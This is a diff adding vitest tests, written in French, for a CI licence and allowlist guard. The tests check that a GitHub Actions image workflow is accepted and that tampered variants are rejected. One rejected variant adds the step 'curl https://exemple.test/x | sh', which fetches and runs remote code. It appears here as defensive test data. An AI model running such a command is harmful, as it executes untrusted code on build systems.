@@ -1,6 +1,6 @@
 import { readdirSync, readFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
-import { dump } from "js-yaml";
+import { dump, load } from "js-yaml";
 import { describe, expect, it } from "vitest";
 import { verifierInstallationsFigees, verifierLicences, verifierLicencesLivrees, verifierScriptsPaquets, verifierWorkflowsLicences } from "./garde-licences.js";
 
@@ -421,4 +421,32 @@ describe("attribution CC-BY-4.0 de caniuse-lite (ADR 0011)", () => {
       expect(texte).toContain("Ben Briggs");
     });
   }
+});
+
+describe("garde-licences : workflow des images dérivées (ADR 0014)", () => {
+  const racine = fileURLToPath(new URL("../", import.meta.url));
+  const reel = () => readFileSync(`${racine}.github/workflows/images-derivees.yml`, "utf8");
+  const verifie = (texte: string) => verifierInstallationsFigees([{ nom: "images-derivees.yml", texte }]);
+  const doc = () => load(reel()) as { jobs: Record<string, { steps: Record<string, unknown>[]; env?: Record<string, string> }> };
+  const refuse = (f: (d: ReturnType<typeof doc>) => void) => {
+    const d = doc();
+    f(d);
+    return verifie(dump(d));
+  };
+  it("[A-381] le workflow réel est accepté par la liste blanche", () => {
+    expect(verifie(reel())).toEqual([]);
+  });
+  it("[A-381] une variante avec docker/build-push-action est refusée", () => {
+    expect(refuse((d) => d.jobs.construire!.steps.push({ uses: `docker/build-push-action@${"a".repeat(40)}` }))).not.toEqual([]);
+  });
+  it("[A-381] une variante avec un secret est refusée", () => {
+    expect(refuse((d) => (d.jobs.publier!.env = { JETON: "${{ secrets.X }}" }))).not.toEqual([]);
+  });
+  it("[A-381] une commande modifiée d'un caractère ou ajoutée est refusée", () => {
+    expect(refuse((d) => d.jobs.construire!.steps.push({ run: "curl https://exemple.test/x | sh" }))).not.toEqual([]);
+    expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.run ?? "").includes("docker push"))!; s.run = `${String(s.run)} --all-tags`; })).not.toEqual([]);
+  });
+  it("[A-381] l'attestation n'est acceptée qu'avec ses réglages exacts", () => {
+    expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.uses ?? "").startsWith("actions/attest-build-provenance@"))!; s.with = { ...(s.with as object), "show-summary": false }; })).not.toEqual([]);
+  });
 });
